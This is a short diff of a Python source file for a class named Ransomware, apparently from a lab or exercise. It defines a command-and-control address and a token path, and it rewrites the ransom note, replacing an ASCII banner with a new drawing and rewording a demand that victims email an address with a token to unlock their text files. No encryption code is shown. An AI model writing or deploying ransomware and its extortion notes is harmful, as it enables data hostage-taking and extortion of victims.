@@ -10,16 +10,60 @@ CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
 ENCRYPT_MESSAGE = """
-  _____                                                                                           
- |  __ \                                                                                          
- | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
- |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
- | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
- |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
-                | |                      __/ |                                               __/ |
-                |_|                     |___/                                               |___/ 
+ 
+     _.----.                          
+       .-"       \-.                       
+      /           ; \                      
+     :           /:  \                     
+     ;         .'  ;  ;                    
+     ;      .-"    :  :                    
+    :   _.+(   .-- :  :                    
+    ;  ;   ' :  :                    
+    ;  :           ;  ;                    
+    :   ;    -    :  :                     
+     )  '   .-.   '  :                     
+    (    '. `"' .'   ;                     
+     "-._.:`---':-"-.'+'                   
+          ;     ;    "                     
+   _..__.-. -. (:                          
+ ,'   .:(o);     "-._                      
+ :    _: 0 ;        \`.                    
+ ;  .'/.\-/-.        `:                    
+:  : :  -U--:"-.  \    ;                   
+;  ; :  ----;   "-.L.-" \                  
+'. '  \ ---(      ;O:    ;                 
+  \ '. '-;-'      :-:    :                 
+   `. ""/         ; :    ;                 
+     ""T      .-":  :`. /                  
+       :  --""   :   ; Y                   
+        ;        ;   : :                   
+        :       :     ; ;                  
+         ;      :   ; : :                  
+         :      ;   :  ; \                 
+          ;    :    ;  :  \_               
+          :    :        \  \"-.            
+          ;    ;         \  `. "-.         
+         :    :     c     \   `./"-._      
+         ;    :            \    \    "-.   
+        :     ;             `.   ;-.  -.`. 
+        :    :       __..--"" \  :  `.\.`.\
+        ;    :_..--"";  ;  _.-'\  ;   ")))T
+       :     ;      _L.-'""     ; :    '-='
+       ;    :_..--""            :  ;       
+      /     ;                   ;; :       
+    .'     /                    ;: J       
+    `.    /                     ;'"        
+      :-.'         /\           ;          
+      ;           /  ;          :          
+     :           /   :          :          
+     ;          /     ;         :          
+    :          /      ;         :          
+    ;         /       :         :          
+   :         /        :         :
 
-Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
+
+
+Your text files are currently inaccessible and require a specific action to unlock them. To regain access, you must send an email to the following address: money@iamrich.com. The email's subject line must include a unique token : '{token}' that will be provided to you in order to authenticate your identity and authorize the release of your data.
 """
 class Ransomware:
 
